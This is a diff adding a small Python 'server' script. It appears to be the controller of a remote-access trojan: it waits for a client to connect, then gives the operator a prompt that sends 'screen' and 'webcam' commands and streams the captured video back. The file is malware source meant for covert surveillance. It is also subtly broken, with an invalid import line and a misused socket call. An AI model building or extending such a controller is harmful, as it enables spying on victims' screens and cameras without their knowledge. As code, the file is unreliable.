@@ -1,0 +1,31 @@
+#server
+
+import vidstream import *
+import socket
+import os
+
+local_ip_address = socket.gethostbyname(socket.gethostname())
+socket_port = 9977
+
+s = socket(socket.AF_INET, socket.SOCK_STREAM)
+s.bind((local_ip_address, socket_port))
+s.listen(9)
+
+client, addr = s.accept()
+network_name = client.recv(1024).decode("utf-8")
+
+print(f"[+] {addr[0]} ({addr[1]}) | {network_name}")
+
+server = StreamingServer(local_ip_address, 6666)
+server.start_server()
+
+print("[~] Server started")
+
+while True:
+    cmd = input(f"{addr[0]}@{network_name}~# ")
+    if cmd == "screen":
+        client.send(cmd.encode("utf-8"))
+    elif cmd == "webcam":
+        client.send(cmd.encode("utf-8"))
+    elif cmd == "clear":
+        os.system("cls")
